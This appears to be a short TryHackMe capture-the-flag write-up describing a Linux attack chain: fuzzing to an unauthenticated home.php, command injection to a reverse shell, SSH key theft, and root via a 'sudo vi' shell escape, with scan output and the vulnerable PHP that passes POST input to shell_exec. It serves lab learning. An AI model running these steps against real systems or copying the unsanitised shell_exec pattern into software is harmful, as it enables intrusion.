---
date: 2025-01-30
description: Linux Command Injection to RCE with some hash cracking
platform: TryHackMe
categories: Web, PrivEsc, Linux
tags:
  - command-injection/linux
  - broken-access-control
  - ssh
  - gtfobins
duration: 50 minutes
---


# Attack Chain
```
1. fuzz for php files > home.php bypass needing to authenticate
2. command execution to reverse shell
3. privesc into charlie by downloading sshkey
4. privesc into root by running vi with sudo 
    sudo vi -c ':!/bin/sh' /dev/null
```
> flag run root.py using the leaked secret key in /var/www/html

scan
```txt
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

http://10.10.110.3 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.110.3], PasswordField[password]

- home.php fuzzed 
```

`home.php`
```php
<?php
    if(isset($_POST['command']))
    {
        $cmd = $_POST['command'];
        echo shell_exec($cmd);
    }
?>
```